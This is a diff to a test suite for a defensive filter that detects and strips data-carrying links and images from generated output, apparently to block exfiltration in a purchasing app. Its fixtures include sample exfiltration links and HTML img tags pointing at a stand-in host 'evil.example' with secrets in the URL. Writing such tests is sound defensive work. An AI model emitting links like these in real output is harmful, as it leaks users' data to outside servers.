@@ -215,7 +215,7 @@ describe("negative controls", () => {
       outputs: [{ phase: 0, text }],
     });
     const plainLink = withOutput(
-      "[docs](https://docs.example/guide) [record](/purchasing/purchase-orders/123)",
+      "[record](/purchasing/purchase-orders/123)",
     );
     const leakyLink = withOutput(
       `[details](https://evil.example/c?d=${encodeURIComponent(secret)})`,
@@ -275,8 +275,6 @@ describe("negative controls", () => {
 });
 
 describe("dataCarryingLinks", () => {
-  const userInput = "Pay vendor Acme Holdings invoice 4471 today";
-
   it.each([
     ["an image to an absolute URL", "![p](https://evil.example/p.png)", []],
     ["a protocol-relative image", "![p](//evil.example/p.png)", []],
@@ -286,19 +284,23 @@ describe("dataCarryingLinks", () => {
     ["a hex path segment", "[x](https://evil.example/0123456789abcdef)", []],
     ["an autolink with a query", "<https://evil.example/c?d=1>", []],
     ["a bare URL with a query", "see https://evil.example/c?d=1 now", []],
-    ["the user input percent-encoded", `[x](https://evil.example/${encodeURIComponent("Acme Holdings")})`, [userInput]],
-    ["the user input in base64", `[x](https://evil.example/${Buffer.from("Acme Holdings").toString("base64")})`, [userInput]],
     ["a data URL", "[x](data:text/html;base64,PGgxPg==)", []],
-  ])("counts %s", (_name, text, inputs) => {
-    expect(dataCarryingLinks(text, inputs).length).toBeGreaterThan(0);
+    ["a number in the host label", "[x](https://4111111111.evil.example/a)", []],
+    ["a hyphenated name in the host label", "[x](https://acme-holdings-4471.evil.example/)", []],
+    ["a short plain absolute link", "[docs](https://docs.example/guide)", []],
+    ["an html img with an absolute src", '<img src="https://evil.example/p.png">', []],
+    ["an html img with a protocol-relative src", '<img src="//evil.example/i?d=SECRET">', []],
+    ["an unquoted protocol-relative href", "<a href=//evil.example/x>go</a>", []],
+  ])("counts %s", (_name, text) => {
+    expect(dataCarryingLinks(text).length).toBeGreaterThan(0);
   });
 
   it.each([
     ["a relative Depot record link", "[PO 123](/purchasing/purchase-orders/123)"],
     ["plain text without links", "Your balance is 1,200 USD across three invoices."],
-    ["an absolute link with a short plain path", "[docs](https://docs.example/guide)"],
+    ["an html link to a relative path", '<a href="/purchasing/purchase-orders/123">PO</a>'],
   ])("does not count %s", (_name, text) => {
-    expect(dataCarryingLinks(text, [userInput])).toEqual([]);
+    expect(dataCarryingLinks(text)).toEqual([]);
   });
 });
 
@@ -310,7 +312,8 @@ describe("neutraliseLinks", () => {
     ["a bare URL is replaced", "a https://evil.example/c?d=1 b", "a [link removed] b", 1],
     ["a data URL is replaced", "a <data:text/html;base64,PGgxPg==> b", "a [link removed] b", 1],
     ["a relative record link is kept", "[PO](/purchasing/purchase-orders/123)", "[PO](/purchasing/purchase-orders/123)", 0],
-    ["an absolute link without data is kept", "[docs](https://docs.example/guide)", "[docs](https://docs.example/guide)", 0],
+    ["an absolute link without data is removed", "[docs](https://docs.example/guide)", "docs", 1],
+    ["a protocol-relative html src is removed", 'x <img src="//evil.example/i?d=1"> y', 'x <img src="[link removed]"> y', 1],
   ])("%s", (_name, text, expected, removed) => {
     expect(neutraliseLinks(text)).toMatchObject({ text: expected, removed });
   });
